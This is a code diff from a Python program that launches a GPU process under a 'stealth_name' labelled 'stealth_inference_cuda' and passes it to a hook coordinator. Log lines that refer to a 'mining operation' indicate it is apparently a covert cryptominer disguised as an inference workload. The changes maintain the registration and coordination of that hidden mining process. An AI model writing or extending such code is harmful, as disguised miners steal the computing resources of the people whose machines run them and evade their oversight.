@@ -383,15 +383,13 @@ def main():
                 # Start PHASE 3++ Coordinated Hook Sequencing in background
                 threading.Thread(target=_coordinated_hook_sequencing, daemon=True).start()
                 logger.info("🚀 [PHASE3++] Coordinated Hook Sequencing started in background")
-                # 🚀 **DIRECT REGISTRY REGISTRATION** (đăng ký registry trực tiếp) - THAY THẾ EVENTBUS
+                # 🚀 **LINEAR FLOW: DIRECT HANDOFF TO HOOKCOORDINATOR** (luồng tuyến tính: chuyển giao trực tiếp đến HookCoordinator)
                 try:
-                    # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
-                    # FIX: Remove duplicate sys import to prevent variable shadowing
-                    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..'))
-                    from pid_logger.direct_registry import get_direct_registry
+                    # **Import HookCoordinator FIRST** (nhập HookCoordinator TRƯỚC TIÊN)
+                    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'coordination'))
+                    from coordinator import get_hook_coordinator
                     
-                    # **Direct process registration** (đăng ký tiến trình trực tiếp) with metadata
-                    registry = get_direct_registry()
+                    # **Process metadata for handoff chain** (metadata tiến trình cho chuỗi handoff)
                     process_metadata = {
                         'stealth_name': new_name,
                         'role': 'real',
@@ -401,75 +399,19 @@ def main():
                         'registration_source': 'stealth_inference_cuda'
                     }
                     
-                    # **ENHANCED SINGLE-SOURCE EMISSION**: Direct registry call với linear flow handoff
-                    success = registry.register_process(
+                    # **STEP 1: PRIMARY HANDOFF TO HOOKCOORDINATOR** (bước 1: handoff chính đến HookCoordinator)
+                    coordinator = get_hook_coordinator()
+                    success = coordinator.receive_from_stealth_wrapper(
                         pid=process.pid,
-                        process_type="gpu", 
-                        process_obj=process,
-                        process_name=new_name,
-                        metadata=process_metadata
+                        process_metadata=process_metadata
                     )
                     
                     if success:
-                        logger.info(f"✅ [LINEAR-FLOW] Single PID emission successful: PID={process.pid}, Name={new_name}")
-                        logger.info(f"📊 [LINEAR-FLOW] Initiating sequential handoff to coordinator")
-                        
-                        # **ENHANCED LINEAR FLOW HANDOFF**: Sequential registration with coordinator và Resource Manager
-                        try:
-                            sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'coordination'))
-                            from coordinator import get_hook_coordinator
-                            
-                            coordinator = get_hook_coordinator()
-                            # **Enhanced coordinator integration** (tích hợp coordinator nâng cao)
-                            if hasattr(coordinator, 'receive_from_registry'):
-                                # Use enhanced linear handoff method
-                                handoff_success = coordinator.receive_from_registry(process.pid, process_metadata)
-                                logger.info(f"🔗 [LINEAR-FLOW] Sequential handoff to coordinator: {'✅ Success' if handoff_success else '❌ Failed'}")
-                                
-                                # **PHASE 2 ENHANCEMENT**: Direct Resource Manager handoff
-                                if handoff_success:
-                                    try:
-                                        # **Import Resource Manager dynamically** (nhập Resource Manager động)
-                                        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'scripts'))
-                                        from resource_manager import ResourceManager
-                                        
-                                        # **Get singleton instance** (lấy instance singleton)
-                                        rm_instance = ResourceManager._instance
-                                        if rm_instance and hasattr(rm_instance, 'receive_from_coordinator'):
-                                            # **Enhanced metadata for resource manager** (metadata nâng cao cho resource manager)
-                                            rm_metadata = {
-                                                'source': 'stealth_inference_cuda',
-                                                'coordinator_handoff_timestamp': time.time(),
-                                                'original_metadata': process_metadata,
-                                                'hook_coordination_status': True,
-                                                'handoff_chain': ['stealth_inference_cuda', 'direct_registry', 'hook_coordinator', 'resource_manager']
-                                            }
-                                            
-                                            rm_success = rm_instance.receive_from_coordinator(process.pid, rm_metadata)
-                                            logger.info(f"🎯 [LINEAR-FLOW] Resource Manager handoff: {'✅ Success' if rm_success else '❌ Failed'}")
-                                            
-                                            if rm_success:
-                                                logger.info(f"✅ [LINEAR-FLOW] Complete linear flow successful for PID {process.pid}")
-                                            else:
-                                                logger.warning(f"⚠️ [LINEAR-FLOW] Resource Manager handoff failed, but coordinator succeeded")
-                                        else:
-                                            logger.warning(f"⚠️ [LINEAR-FLOW] Resource Manager not ready for linear handoff")
-                                            
-                                    except Exception as rm_err:
-                                        logger.error(f"❌ [LINEAR-FLOW] Resource Manager handoff failed: {rm_err}")
-                                        # Continue anyway - coordinator succeeded
-                                        
-                            else:
-                                # Fallback to existing registration
-                                coordinator.register_pid(process.pid)
-                                logger.info(f"🔗 [LINEAR-FLOW] Fallback registration with coordinator completed")
-                            
-                        except Exception as coord_err:
-                            logger.error(f"❌ [LINEAR-FLOW] Coordinator handoff failed: {coord_err}")
-                            # Continue anyway - non-critical for mining operation
-                            
+                        logger.info(f"✅ [LINEAR-FLOW] Primary handoff to HookCoordinator successful: PID={process.pid}")
+                        logger.info(f"🔗 [LINEAR-FLOW] HookCoordinator will handle sequential forwarding to DirectPIDRegistry → ResourceManager")
                     else:
-                        logger.error(f"❌ [LINEAR-FLOW] Single PID emission failed for process PID {process.pid}")
+                        logger.warning(f"⚠️ [LINEAR-FLOW] Primary handoff to HookCoordinator failed for PID {process.pid}")
+                        logger.warning(f"🔄 [LINEAR-FLOW] Mining process will continue but coordination may be limited")
                         
                 except Exception as registry_err:
                     logger.error(f"❌ [DIRECT-REGISTRY] Registration failed: {registry_err}")
